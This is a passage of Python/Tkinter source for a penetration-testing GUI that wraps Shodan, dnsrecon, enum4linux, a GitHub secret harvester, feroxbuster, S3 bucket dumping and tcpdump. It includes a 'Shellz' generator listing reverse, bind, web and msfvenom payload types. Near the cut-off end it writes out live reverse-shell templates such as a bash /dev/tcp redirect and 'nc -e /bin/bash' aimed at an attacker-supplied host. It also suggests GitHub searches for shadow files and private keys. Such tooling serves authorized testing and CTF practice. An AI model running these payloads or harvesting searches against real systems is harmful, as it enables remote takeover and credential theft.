        # BUTTONS SECTION
        # ═══════════════════════════════════════════════════════════
        btn_frame = tk.Frame(scrollable_frame, bg=self.bg_secondary)
        btn_frame.grid(row=row, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=15)

        tk.Button(btn_frame, text="📋 CHEAT SHEET", font=("Courier", 9, "bold"),
                 bg=self.bg_tertiary, fg=self.accent_cyan, relief=tk.FLAT, padx=15, pady=8,
                 cursor="hand2", command=lambda: self.show_cheatsheet("shodan")).pack(side=tk.LEFT, padx=5)

        tk.Button(btn_frame, text="💳 CHECK CREDITS", font=("Courier", 9, "bold"),
                 bg=self.bg_tertiary, fg=self.accent_orange, relief=tk.FLAT, padx=15, pady=8,
                 cursor="hand2", command=self.check_shodan_credits).pack(side=tk.LEFT, padx=5)

        return frame

    def update_shodan_preset_queries(self, event=None):
        """Update preset query dropdown based on selected category."""
        category = self.shodan_preset_category.get()
        queries = self.shodan_presets.get(category, [])
        self.shodan_preset_query['values'] = [name for name, _ in queries]
        if queries:
            self.shodan_preset_query.current(0)

    def apply_shodan_preset(self):
        """Apply selected preset query to the search field."""
        category = self.shodan_preset_category.get()
        query_name = self.shodan_preset_query.get()
        for name, query in self.shodan_presets.get(category, []):
            if name == query_name:
                self.shodan_query.delete(0, tk.END)
                self.shodan_query.insert(0, query)
                self.update_status(f"Applied: {query_name}")
                break

    def set_shodan_query(self, query):
        """Set the Shodan query field."""
        self.shodan_query.delete(0, tk.END)
        self.shodan_query.insert(0, query)

    def build_shodan_query(self):
        """Build a Shodan query from the filter fields."""
        parts = []
        base = self.shodan_query.get().strip()
        if base:
            parts.append(base)

        if self.shodan_country.get():
            parts.append(f"country:{self.shodan_country.get()}")
        if self.shodan_city.get():
            parts.append(f'city:"{self.shodan_city.get()}"')
        if self.shodan_org.get():
            parts.append(f'org:"{self.shodan_org.get()}"')
        if self.shodan_port.get():
            parts.append(f"port:{self.shodan_port.get()}")
        if self.shodan_net.get():
            parts.append(f"net:{self.shodan_net.get()}")
        if self.shodan_asn.get():
            parts.append(f"asn:{self.shodan_asn.get()}")
        if self.shodan_product.get():
            parts.append(f'product:"{self.shodan_product.get()}"')
        if self.shodan_os.get():
            parts.append(f'os:"{self.shodan_os.get()}"')
        if self.shodan_version.get():
            parts.append(f'version:"{self.shodan_version.get()}"')
        if self.shodan_title.get():
            parts.append(f'http.title:"{self.shodan_title.get()}"')
        if self.shodan_html.get():
            parts.append(f'http.html:"{self.shodan_html.get()}"')
        if self.shodan_screenshot_var.get():
            parts.append("has_screenshot:true")
        if self.shodan_cve.get():
            parts.append(f"vuln:{self.shodan_cve.get()}")

        self.shodan_query.delete(0, tk.END)
        self.shodan_query.insert(0, " ".join(parts))
        self.update_status(f"Built query with {len(parts)} filters")

    def clear_shodan_filters(self):
        """Clear all Shodan filter fields."""
        self.shodan_country.set("")
        self.shodan_city.delete(0, tk.END)
        self.shodan_org.delete(0, tk.END)
        self.shodan_port.delete(0, tk.END)
        self.shodan_net.delete(0, tk.END)
        self.shodan_asn.delete(0, tk.END)
        self.shodan_product.set("")
        self.shodan_os.set("")
        self.shodan_version.delete(0, tk.END)
        self.shodan_title.delete(0, tk.END)
        self.shodan_html.delete(0, tk.END)
        self.shodan_screenshot_var.set(False)
        self.shodan_cve.delete(0, tk.END)
        self.update_status("Cleared all filters")

    def on_shodan_type_change(self, event=None):
        """Handle Shodan search type change."""
        search_type = self.shodan_type.get().split(" - ")[0]
        placeholders = {
            "search": "apache port:443 country:US",
            "host": "8.8.8.8",
            "domain": "example.com",
            "dns resolve": "google.com,facebook.com",
            "dns reverse": "8.8.8.8,8.8.4.4",
            "exploits": "apache cve",
            "count": "port:22 country:US",
            "info": ""
        }
        self.shodan_query.delete(0, tk.END)
        if placeholders.get(search_type):
            self.shodan_query.insert(0, placeholders[search_type])

    def validate_shodan_api_key(self):
        """Validate the configured Shodan API key."""
        api_key = self.config.get("shodan_api_key", "")
        if not api_key:
            messagebox.showwarning("No API Key", "No Shodan API key configured.\nGo to Settings to add your API key.")
            return
        self.shodan_api_status.config(text="✅ API Key Configured", fg=self.accent_green)
        self.update_status("API key configured. Run 'info' search to verify.")

    def check_shodan_credits(self):
        """Check remaining Shodan API credits."""
        api_key = self.config.get("shodan_api_key", "")
        if not api_key:
            messagebox.showwarning("No API Key", "No Shodan API key configured.\nGo to Settings to add your API key.")
            return
        self.shodan_type.set("info - API info & credits")
        self.shodan_query.delete(0, tk.END)
        self.update_status("Run scan to check Shodan credits")

    def create_dnsrecon_tab(self):
        frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
        frame.columnconfigure(1, weight=1)

        # Domain
        self.dnsrecon_domain = self.create_labeled_entry(frame, "Domain:", 0, "example.com")

        # Scan type
        label = tk.Label(frame, text="Scan Type:", font=("Courier", 10),
                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        label.grid(row=1, column=0, sticky=tk.W, padx=10, pady=5)

        self.dnsrecon_type = ttk.Combobox(frame, values=[
            "std (Standard enumeration)",
            "axfr (Zone transfer)",
            "brt (Brute force subdomains)",
            "rvl (Reverse lookup)",
            "srv (SRV records)",
            "crt (crt.sh search)",
            "zonewalk (DNSSEC zone walk)"
        ], font=("Courier", 9), state="readonly", width=28)
        self.dnsrecon_type.grid(row=1, column=1, sticky=tk.EW, padx=10, pady=5)
        self.dnsrecon_type.current(0)

        # Wordlist for brute force
        label = tk.Label(frame, text="Wordlist (brt):", font=("Courier", 10),
                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        label.grid(row=2, column=0, sticky=tk.W, padx=10, pady=5)

        wordlist_frame = tk.Frame(frame, bg=self.bg_secondary)
        wordlist_frame.grid(row=2, column=1, sticky=tk.EW, padx=10, pady=5)

        self.dnsrecon_wordlist = tk.Entry(wordlist_frame, font=("Courier", 10),
                                         bg=self.bg_primary, fg=self.accent_cyan,
                                         insertbackground=self.accent_cyan, relief=tk.FLAT)
        self.dnsrecon_wordlist.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        self.dnsrecon_wordlist.insert(0, "/usr/share/wordlists/dnsmap.txt")

        browse_btn = tk.Button(wordlist_frame, text="📂", font=("Courier", 9),
                              bg=self.bg_primary, fg=self.text_color,
                              relief=tk.FLAT, cursor="hand2",
                              command=lambda: self.browse_wordlist(self.dnsrecon_wordlist))
        browse_btn.pack(side=tk.RIGHT, padx=(5, 0))

        # Name server
        self.dnsrecon_ns = self.create_labeled_entry(frame, "Name Server:", 3, "")

        # Additional options
        self.dnsrecon_options = self.create_labeled_entry(frame, "Extra Options:", 4, "")

        # Info label
        info_label = tk.Label(
            frame,
            text="\n📡 DNS Reconnaissance\nComprehensive DNS enumeration\n\nCommon tasks:\n• Zone transfers\n• Subdomain brute-force\n• Reverse lookups",
            font=("Courier", 9),
            fg=self.accent_cyan,
            bg=self.bg_secondary,
            justify=tk.LEFT,
            wraplength=320
        )
        info_label.grid(row=5, column=0, columnspan=2, sticky=tk.W, padx=10, pady=20)

        # Cheat Sheet Button
        cheat_btn = tk.Button(
            frame,
            text="📋 VIEW CHEAT SHEET",
            font=("Courier", 9, "bold"),
            bg=self.bg_tertiary,
            fg=self.accent_cyan,
            activebackground=self.accent_cyan,
            activeforeground=self.bg_primary,
            relief=tk.FLAT,
            padx=15,
            pady=8,
            cursor="hand2",
            command=lambda: self.show_cheatsheet("dnsrecon")
        )
        cheat_btn.grid(row=6, column=0, columnspan=2, pady=10)

        return frame

    def create_enum4linux_tab(self):
        frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
        frame.columnconfigure(1, weight=1)

        # Target IP
        self.enum4linux_target = self.create_labeled_entry(frame, "Target IP:", 0, "")

        # Quick option
        self.enum4linux_all_var = tk.BooleanVar(value=True)
        all_check = tk.Checkbutton(frame, text="All Enumeration (-a)", variable=self.enum4linux_all_var,
                                   font=("Courier", 10), fg=self.text_color,
                                   bg=self.bg_secondary, selectcolor=self.bg_primary,
                                   activebackground=self.bg_secondary, activeforeground=self.accent_green)
        all_check.grid(row=1, column=0, columnspan=2, sticky=tk.W, padx=10, pady=5)

        # Individual options
        options_frame = tk.Frame(frame, bg=self.bg_secondary)
        options_frame.grid(row=2, column=0, columnspan=2, sticky=tk.W, padx=10, pady=5)

        self.enum4linux_users_var = tk.BooleanVar()
        self.enum4linux_shares_var = tk.BooleanVar()
        self.enum4linux_groups_var = tk.BooleanVar()
        self.enum4linux_pass_var = tk.BooleanVar()

        tk.Checkbutton(options_frame, text="Users (-U)", variable=self.enum4linux_users_var,
                      font=("Courier", 9), fg=self.text_color, bg=self.bg_secondary,
                      selectcolor=self.bg_primary).pack(side=tk.LEFT, padx=5)
        tk.Checkbutton(options_frame, text="Shares (-S)", variable=self.enum4linux_shares_var,
                      font=("Courier", 9), fg=self.text_color, bg=self.bg_secondary,
                      selectcolor=self.bg_primary).pack(side=tk.LEFT, padx=5)
        tk.Checkbutton(options_frame, text="Groups (-G)", variable=self.enum4linux_groups_var,
                      font=("Courier", 9), fg=self.text_color, bg=self.bg_secondary,
                      selectcolor=self.bg_primary).pack(side=tk.LEFT, padx=5)
        tk.Checkbutton(options_frame, text="Password Policy (-P)", variable=self.enum4linux_pass_var,
                      font=("Courier", 9), fg=self.text_color, bg=self.bg_secondary,
                      selectcolor=self.bg_primary).pack(side=tk.LEFT, padx=5)

        # Credentials (optional)
        self.enum4linux_user = self.create_labeled_entry(frame, "Username:", 3, "")
        self.enum4linux_pass = self.create_labeled_entry(frame, "Password:", 4, "")

        # Additional options
        self.enum4linux_options = self.create_labeled_entry(frame, "Extra Options:", 5, "")

        # Info label
        info_label = tk.Label(
            frame,
            text="\n🖥️  SMB/Windows Enumeration\nEnumerate Windows/Samba systems\n\nEnumerates:\n• User lists\n• Share lists\n• Groups & policies",
            font=("Courier", 9),
            fg=self.accent_cyan,
            bg=self.bg_secondary,
            justify=tk.LEFT,
            wraplength=320
        )
        info_label.grid(row=6, column=0, columnspan=2, sticky=tk.W, padx=10, pady=20)

        # Cheat Sheet Button
        cheat_btn = tk.Button(
            frame,
            text="📋 VIEW CHEAT SHEET",
            font=("Courier", 9, "bold"),
            bg=self.bg_tertiary,
            fg=self.accent_cyan,
            activebackground=self.accent_cyan,
            activeforeground=self.bg_primary,
            relief=tk.FLAT,
            padx=15,
            pady=8,
            cursor="hand2",
            command=lambda: self.show_cheatsheet("enum4linux")
        )
        cheat_btn.grid(row=7, column=0, columnspan=2, pady=10)

        return frame

    def create_githarvester_tab(self):
        frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
        frame.columnconfigure(1, weight=1)

        # Search query
        self.githarvester_search = self.create_labeled_entry(frame, "GitHub Search:", 0, "filename:config")

        # Custom regex
        self.githarvester_regex = self.create_labeled_entry(frame, "Regex Pattern:", 1, "")

        # Account/Organization
        self.githarvester_account = self.create_labeled_entry(frame, "User/Org:", 2, "")

        # Project
        self.githarvester_project = self.create_labeled_entry(frame, "Project:", 3, "")

        # Sort order
        label = tk.Label(frame, text="Sort By:", font=("Courier", 10),
                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        label.grid(row=4, column=0, sticky=tk.W, padx=10, pady=5)

        self.githarvester_sort = ttk.Combobox(frame, values=[
            "best",
            "new",
            "old"
        ], font=("Courier", 9), state="readonly", width=28)
        self.githarvester_sort.grid(row=4, column=1, sticky=tk.EW, padx=10, pady=5)
        self.githarvester_sort.current(0)

        # Additional options
        self.githarvester_options = self.create_labeled_entry(frame, "Extra Options:", 5, "")

        # Info label
        info_label = tk.Label(
            frame,
            text="\n🔎 GitHub OSINT\nHarvest sensitive data from GitHub\n\nExample searches:\n• filename:shadow path:etc\n• extension:pem private\n• password",
            font=("Courier", 9),
            fg=self.accent_cyan,
            bg=self.bg_secondary,
            justify=tk.LEFT,
            wraplength=320
        )
        info_label.grid(row=6, column=0, columnspan=2, sticky=tk.W, padx=10, pady=20)

        # Cheat Sheet Button
        cheat_btn = tk.Button(
            frame,
            text="📋 VIEW CHEAT SHEET",
            font=("Courier", 9, "bold"),
            bg=self.bg_tertiary,
            fg=self.accent_cyan,
            activebackground=self.accent_cyan,
            activeforeground=self.bg_primary,
            relief=tk.FLAT,
            padx=15,
            pady=8,
            cursor="hand2",
            command=lambda: self.show_cheatsheet("githarvester")
        )
        cheat_btn.grid(row=7, column=0, columnspan=2, pady=10)

        return frame

    def create_feroxbuster_tab(self):
        frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
        frame.columnconfigure(1, weight=1)

        # Target URL
        self.ferox_url = self.create_labeled_entry(frame, "Target URL:", 0, "http://")

        # Wordlist
        label = tk.Label(frame, text="Wordlist:", font=("Courier", 10),
                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        label.grid(row=1, column=0, sticky=tk.W, padx=10, pady=5)

        wordlist_frame = tk.Frame(frame, bg=self.bg_secondary)
        wordlist_frame.grid(row=1, column=1, sticky=tk.EW, padx=10, pady=5)

        self.ferox_wordlist = tk.Entry(wordlist_frame, font=("Courier", 10),
                                      bg=self.bg_primary, fg=self.accent_cyan,
                                      insertbackground=self.accent_cyan, relief=tk.FLAT)
        self.ferox_wordlist.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        self.ferox_wordlist.insert(0, "/usr/share/seclists/Discovery/Web-Content/common.txt")

        browse_btn = tk.Button(wordlist_frame, text="📂", font=("Courier", 9),
                              bg=self.bg_primary, fg=self.text_color,
                              relief=tk.FLAT, cursor="hand2",
                              command=lambda: self.browse_wordlist(self.ferox_wordlist))
        browse_btn.pack(side=tk.RIGHT, padx=(5, 0))

        # Extensions
        self.ferox_extensions = self.create_labeled_entry(frame, "Extensions:", 2, "php,html,txt")

        # Threads
        self.ferox_threads = self.create_labeled_entry(frame, "Threads:", 3, "50")

        # Depth
        self.ferox_depth = self.create_labeled_entry(frame, "Depth:", 4, "4")

        # Additional options
        self.ferox_options = self.create_labeled_entry(frame, "Extra Options:", 5, "")

        # Info label
        info_label = tk.Label(
            frame,
            text="\n🦀 feroxbuster (Rust)\nFast web content discovery\n\nFeatures:\n• Recursive scanning\n• Fast multi-threading\n• Extension filtering",
            font=("Courier", 9),
            fg=self.accent_cyan,
            bg=self.bg_secondary,
            justify=tk.LEFT,
            wraplength=320
        )
        info_label.grid(row=6, column=0, columnspan=2, sticky=tk.W, padx=10, pady=20)

        # Cheat Sheet Button
        cheat_btn = tk.Button(
            frame,
            text="📋 VIEW CHEAT SHEET",
            font=("Courier", 9, "bold"),
            bg=self.bg_tertiary,
            fg=self.accent_cyan,
            activebackground=self.accent_cyan,
            activeforeground=self.bg_primary,
            relief=tk.FLAT,
            padx=15,
            pady=8,
            cursor="hand2",
            command=lambda: self.show_cheatsheet("feroxbuster")
        )
        cheat_btn.grid(row=7, column=0, columnspan=2, pady=10)

        return frame

    def create_awsbucket_tab(self):
        frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
        frame.columnconfigure(1, weight=1)

        # Bucket list file
        label = tk.Label(frame, text="Bucket List:", font=("Courier", 10),
                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        label.grid(row=0, column=0, sticky=tk.W, padx=10, pady=5)

        bucketlist_frame = tk.Frame(frame, bg=self.bg_secondary)
        bucketlist_frame.grid(row=0, column=1, sticky=tk.EW, padx=10, pady=5)

        self.awsbucket_list = tk.Entry(bucketlist_frame, font=("Courier", 10),
                                      bg=self.bg_primary, fg=self.accent_cyan,
                                      insertbackground=self.accent_cyan, relief=tk.FLAT)
        self.awsbucket_list.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        self.awsbucket_list.insert(0, "buckets.txt")

        browse_btn = tk.Button(bucketlist_frame, text="📂", font=("Courier", 9),
                              bg=self.bg_primary, fg=self.text_color,
                              relief=tk.FLAT, cursor="hand2",
                              command=lambda: self.browse_wordlist(self.awsbucket_list))
        browse_btn.pack(side=tk.RIGHT, padx=(5, 0))

        # Grep wordlist (optional)
        label = tk.Label(frame, text="Grep Keywords:", font=("Courier", 10),
                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        label.grid(row=1, column=0, sticky=tk.W, padx=10, pady=5)

        grep_frame = tk.Frame(frame, bg=self.bg_secondary)
        grep_frame.grid(row=1, column=1, sticky=tk.EW, padx=10, pady=5)

        self.awsbucket_grep = tk.Entry(grep_frame, font=("Courier", 10),
                                      bg=self.bg_primary, fg=self.accent_cyan,
                                      insertbackground=self.accent_cyan, relief=tk.FLAT)
        self.awsbucket_grep.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        self.awsbucket_grep.insert(0, "")

        browse_btn2 = tk.Button(grep_frame, text="📂", font=("Courier", 9),
                               bg=self.bg_primary, fg=self.text_color,
                               relief=tk.FLAT, cursor="hand2",
                               command=lambda: self.browse_wordlist(self.awsbucket_grep))
        browse_btn2.pack(side=tk.RIGHT, padx=(5, 0))

        # Download option
        self.awsbucket_download_var = tk.BooleanVar()
        download_check = tk.Checkbutton(frame, text="Download Files (-D)", variable=self.awsbucket_download_var,
                                       font=("Courier", 10), fg=self.text_color,
                                       bg=self.bg_secondary, selectcolor=self.bg_primary,
                                       activebackground=self.bg_secondary, activeforeground=self.accent_green)
        download_check.grid(row=2, column=0, columnspan=2, sticky=tk.W, padx=10, pady=5)

        # Threads
        self.awsbucket_threads = self.create_labeled_entry(frame, "Threads:", 3, "5")

        # Additional options
        self.awsbucket_options = self.create_labeled_entry(frame, "Extra Options:", 4, "")

        # Info label
        info_label = tk.Label(
            frame,
            text="\n☁️  AWS S3 Bucket Dump\nEnumerate and dump S3 buckets\n\n⚠️ Use responsibly\nOnly test authorized targets",
            font=("Courier", 9),
            fg=self.accent_cyan,
            bg=self.bg_secondary,
            justify=tk.LEFT,
            wraplength=320
        )
        info_label.grid(row=5, column=0, columnspan=2, sticky=tk.W, padx=10, pady=20)

        # Cheat Sheet Button
        cheat_btn = tk.Button(
            frame,
            text="📋 VIEW CHEAT SHEET",
            font=("Courier", 9, "bold"),
            bg=self.bg_tertiary,
            fg=self.accent_cyan,
            activebackground=self.accent_cyan,
            activeforeground=self.bg_primary,
            relief=tk.FLAT,
            padx=15,
            pady=8,
            cursor="hand2",
            command=lambda: self.show_cheatsheet("awsbucket")
        )
        cheat_btn.grid(row=6, column=0, columnspan=2, pady=10)

        return frame

    def get_network_interfaces(self):
        """Get list of available network interfaces."""
        interfaces = ["eth0", "wlan0", "lo", "any"]  # Default common interfaces
        try:
            # Try to get actual interfaces from /sys/class/net
            net_path = "/sys/class/net"
            if os.path.isdir(net_path):
                actual_interfaces = os.listdir(net_path)
                # Filter out unwanted interfaces and sort
                filtered = [iface for iface in actual_interfaces if iface and not iface.startswith('.')]
                if filtered:
                    interfaces = sorted(filtered) + ["any"]
        except Exception:
            pass
        return interfaces

    def refresh_interfaces(self):
        """Refresh the list of network interfaces in the TCPDump dropdown."""
        if hasattr(self, 'tcpdump_interface'):
            current = self.tcpdump_interface.get()
            interfaces = self.get_network_interfaces()
            self.tcpdump_interface['values'] = interfaces
            # Restore current selection if still valid
            if current in interfaces:
                self.tcpdump_interface.set(current)
            elif interfaces:
                self.tcpdump_interface.current(0)
            self.update_status("Network interfaces refreshed")

    def create_tcpdump_tab(self):
        frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
        frame.columnconfigure(1, weight=1)

        # Warning label
        warning_label = tk.Label(
            frame,
            text="⚠️  REQUIRES ROOT/SUDO PRIVILEGES  ⚠️\nYou will be prompted for password",
            font=("Courier", 9, "bold"),
            fg=self.accent_red,
            bg=self.bg_secondary,
            justify=tk.CENTER,
            wraplength=320
        )
        warning_label.grid(row=0, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=10)

        # Interface - Dropdown with available interfaces
        label = tk.Label(frame, text="Interface:", font=("Courier", 10),
                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        label.grid(row=1, column=0, sticky=tk.W, padx=10, pady=5)

        interface_frame = tk.Frame(frame, bg=self.bg_secondary)
        interface_frame.grid(row=1, column=1, sticky=tk.EW, padx=10, pady=5)
        interface_frame.columnconfigure(0, weight=1)

        interfaces = self.get_network_interfaces()
        self.tcpdump_interface = ttk.Combobox(interface_frame, values=interfaces,
                                             font=("Courier", 10), state="readonly", width=20)
        self.tcpdump_interface.pack(side=tk.LEFT, fill=tk.X, expand=True)
        if interfaces:
            self.tcpdump_interface.current(0)

        # Refresh button to reload interfaces
        refresh_btn = tk.Button(interface_frame, text="🔄", font=("Courier", 9),
                               bg=self.bg_primary, fg=self.text_color,
                               relief=tk.FLAT, cursor="hand2",
                               command=self.refresh_interfaces)
        refresh_btn.pack(side=tk.RIGHT, padx=(5, 0))

        # Capture filter
        self.tcpdump_filter = self.create_labeled_entry(frame, "BPF Filter:", 2, "port 80")

        # Packet count
        self.tcpdump_count = self.create_labeled_entry(frame, "Packet Count:", 3, "100")

        # Output file (optional)
        self.tcpdump_output = self.create_labeled_entry(frame, "Output File:", 4, "capture.pcap")

        # Verbose option
        self.tcpdump_verbose_var = tk.BooleanVar()
        verbose_check = tk.Checkbutton(frame, text="Verbose (-v)", variable=self.tcpdump_verbose_var,
                                      font=("Courier", 10), fg=self.text_color,
                                      bg=self.bg_secondary, selectcolor=self.bg_primary,
                                      activebackground=self.bg_secondary, activeforeground=self.accent_green)
        verbose_check.grid(row=5, column=0, columnspan=2, sticky=tk.W, padx=10, pady=5)

        # Additional options
        self.tcpdump_options = self.create_labeled_entry(frame, "Extra Options:", 6, "")

        # Info label
        info_label = tk.Label(
            frame,
            text="\n📦 Packet Capture\nCapture and analyze network traffic\n\nExample filters:\n• port 80\n• host 192.168.1.1\n• tcp and port 443",
            font=("Courier", 9),
            fg=self.accent_cyan,
            bg=self.bg_secondary,
            justify=tk.LEFT,
            wraplength=320
        )
        info_label.grid(row=7, column=0, columnspan=2, sticky=tk.W, padx=10, pady=20)

        # Cheat Sheet Button
        cheat_btn = tk.Button(
            frame,
            text="📋 VIEW CHEAT SHEET",
            font=("Courier", 9, "bold"),
            bg=self.bg_tertiary,
            fg=self.accent_cyan,
            activebackground=self.accent_cyan,
            activeforeground=self.bg_primary,
            relief=tk.FLAT,
            padx=15,
            pady=8,
            cursor="hand2",
            command=lambda: self.show_cheatsheet("tcpdump")
        )
        cheat_btn.grid(row=8, column=0, columnspan=2, pady=10)

        return frame

    def create_shellz_tab(self):
        """Create the Shellz tab for shell generation (reverse, bind, web, encrypted, msfvenom)."""
        frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
        frame.columnconfigure(1, weight=1)

        # Header
        header = tk.Label(
            frame,
            text="🐚 SHELL GENERATOR",
            font=("Courier", 14, "bold"),
            fg=self.accent_cyan,
            bg=self.bg_secondary
        )
        header.grid(row=0, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=15)

        # Shell Category dropdown
        cat_label = tk.Label(frame, text="Shell Category:", font=("Courier", 10),
                            fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        cat_label.grid(row=1, column=0, sticky=tk.W, padx=10, pady=5)

        self.shellz_category = ttk.Combobox(frame, values=[
            "Reverse Shells",
            "Bind Shells",
            "Web Shells",
            "Encrypted Shells",
            "MSFVenom Payloads"
        ], font=("Courier", 10), state="readonly", width=25)
        self.shellz_category.grid(row=1, column=1, sticky=tk.W, padx=10, pady=5)
        self.shellz_category.current(0)
        self.shellz_category.bind("<<ComboboxSelected>>", self.update_shell_types)

        # IP Address
        self.shellz_ip = self.create_labeled_entry(frame, "LHOST (Your IP):", 2, "")

        # Port
        self.shellz_port = self.create_labeled_entry(frame, "LPORT:", 3, "4444")

        # Shell type dropdown
        type_label = tk.Label(frame, text="Shell Type:", font=("Courier", 10),
                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        type_label.grid(row=4, column=0, sticky=tk.W, padx=10, pady=5)

        # Define shell types for each category
        self.shell_type_options = {
            "Reverse Shells": [
                "Bash TCP",
                "Bash UDP",
                "Netcat Traditional",
                "Netcat OpenBSD",
                "Netcat BusyBox",
                "Netcat Windows",
                "Python",
                "Python3",
                "Python Windows",
                "Perl",
                "Perl Windows",
                "PHP",
                "PHP exec",
                "PHP passthru",
                "Ruby",
                "Ruby Windows",
                "Java",
                "Java Runtime",
                "PowerShell",
                "PowerShell Base64",
                "PowerShell SSL",
                "Socat",
                "Socat TTY",
                "Awk",
                "Lua",
                "Node.js",
                "Groovy",
                "Telnet",
                "Zsh",
                "Golang",
                "C (Linux)",
                "C (Windows)"
            ],
            "Bind Shells": [
                "Netcat Bind",
                "Netcat Bind (Windows)",
                "Python Bind",
                "Python3 Bind",
                "Perl Bind",
                "PHP Bind",
                "Ruby Bind",
                "Socat Bind",
                "Socat Bind TTY",
                "PowerShell Bind",
                "Node.js Bind",
                "Awk Bind"
            ],
            "Web Shells": [
                "PHP Simple",
                "PHP System",
                "PHP Passthru",
                "PHP Shell_exec",
                "PHP Backtick",
                "PHP popen",
                "PHP proc_open",
                "PHP Full Featured",
                "PHP Upload",
                "PHP File Manager",
                "ASP CMD",
                "ASP.NET CMD",
                "ASPX CMD",
                "ASPX Full",
                "JSP CMD",
                "JSP Runtime",
                "JSP ProcessBuilder",
                "WAR Shell Info",
                "CGI Bash",
                "CGI Perl",
                "CGI Python",
                "Node.js Express"
            ],
            "Encrypted Shells": [
                "OpenSSL Reverse",
                "OpenSSL Bind",
                "Ncat SSL Reverse",
                "Ncat SSL Bind",
                "Socat SSL Reverse",
                "Socat SSL Bind",
                "Python SSL Reverse",
                "PowerShell SSL Reverse",
                "Bash /dev/tcp SSL"
            ],
            "MSFVenom Payloads": [
                "Linux x86 Reverse",
                "Linux x64 Reverse",
                "Linux x86 Bind",
                "Linux x64 Bind",
                "Linux x86 Meterpreter",
                "Linux x64 Meterpreter",
                "Windows x86 Reverse",
                "Windows x64 Reverse",
                "Windows x86 Bind",
                "Windows x64 Bind",
                "Windows x86 Meterpreter",
                "Windows x64 Meterpreter",
                "Windows x64 Meterpreter HTTPS",
                "PHP Meterpreter",
                "Python Meterpreter",
                "Java Meterpreter",
                "ASP Meterpreter",
                "ASPX Meterpreter",
                "JSP Meterpreter",
                "WAR Meterpreter",
                "macOS x64 Reverse",
                "macOS x64 Bind",
                "Android Meterpreter",
                "NodeJS Reverse"
            ]
        }

        self.shellz_type = ttk.Combobox(frame, values=self.shell_type_options["Reverse Shells"],
                                        font=("Courier", 10), state="readonly", width=25)
        self.shellz_type.grid(row=4, column=1, sticky=tk.W, padx=10, pady=5)
        self.shellz_type.current(0)

        # Generate button
        gen_btn = tk.Button(
            frame,
            text="⚡ GENERATE SHELL",
            font=("Courier", 11, "bold"),
            bg=self.accent_green,
            fg=self.bg_primary,
            activebackground=self.accent_cyan,
            relief=tk.FLAT,
            padx=20,
            pady=10,
            cursor="hand2",
            command=self.generate_shell
        )
        gen_btn.grid(row=5, column=0, columnspan=2, padx=10, pady=15)

        # Output area
        output_label = tk.Label(frame, text="Generated Shell:", font=("Courier", 10, "bold"),
                               fg=self.accent_cyan, bg=self.bg_secondary)
        output_label.grid(row=6, column=0, columnspan=2, sticky=tk.W, padx=10, pady=(10, 5))

        self.shellz_output = scrolledtext.ScrolledText(
            frame, height=10, font=("Consolas", 11),
            bg="#1E1E1E", fg=self.accent_green,
            insertbackground=self.accent_green,
            selectbackground=self.accent_yellow,
            wrap=tk.WORD, relief=tk.FLAT
        )
        self.shellz_output.grid(row=7, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=5)

        # Copy button
        copy_btn = tk.Button(
            frame,
            text="📋 COPY TO CLIPBOARD",
            font=("Courier", 9, "bold"),
            bg=self.bg_tertiary,
            fg=self.accent_cyan,
            activebackground=self.accent_cyan,
            activeforeground=self.bg_primary,
            relief=tk.FLAT,
            padx=15,
            pady=8,
            cursor="hand2",
            command=lambda: self.copy_to_clipboard(self.shellz_output.get("1.0", tk.END))
        )
        copy_btn.grid(row=8, column=0, columnspan=2, pady=10)

        # Info label
        info_label = tk.Label(
            frame,
            text="For authorized penetration testing and CTF challenges only",
            font=("Courier", 8),
            fg=self.text_muted,
            bg=self.bg_secondary
        )
        info_label.grid(row=9, column=0, columnspan=2, pady=5)

        return frame

    def update_shell_types(self, event=None):
        """Update shell type dropdown based on selected category."""
        category = self.shellz_category.get()
        shell_types = self.shell_type_options.get(category, [])
        self.shellz_type['values'] = shell_types
        if shell_types:
            self.shellz_type.current(0)

    def generate_shell(self):
        """Generate a shell based on selected category and type."""
        ip = self.shellz_ip.get().strip()
        port = self.shellz_port.get().strip()
        category = self.shellz_category.get()
        shell_type = self.shellz_type.get()

        # Web shells don't always need IP/port
        if category != "Web Shells":
            if not ip or not port:
                messagebox.showerror("Error", "Please enter IP address and port")
                return

        shell_cmd = ""

        if category == "Reverse Shells":
            shell_cmd = self.get_reverse_shell(ip, port, shell_type)
        elif category == "Bind Shells":
            shell_cmd = self.get_bind_shell(port, shell_type)
        elif category == "Web Shells":
            shell_cmd = self.get_web_shell(shell_type)
        elif category == "Encrypted Shells":
            shell_cmd = self.get_encrypted_shell(ip, port, shell_type)
        elif category == "MSFVenom Payloads":
            shell_cmd = self.get_msfvenom_payload(ip, port, shell_type)

        self.shellz_output.delete("1.0", tk.END)
        self.shellz_output.insert("1.0", shell_cmd)

    def generate_reverse_shell(self):
        """Legacy method - calls generate_shell for backwards compatibility."""
        self.generate_shell()

    def get_reverse_shell(self, ip, port, shell_type):
        """Get reverse shell payload based on type."""
        shells = {
            # Bash shells
            "Bash TCP": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            "Bash UDP": f"bash -i >& /dev/udp/{ip}/{port} 0>&1",

            # Netcat shells
            "Netcat Traditional": f"nc -e /bin/bash {ip} {port}",
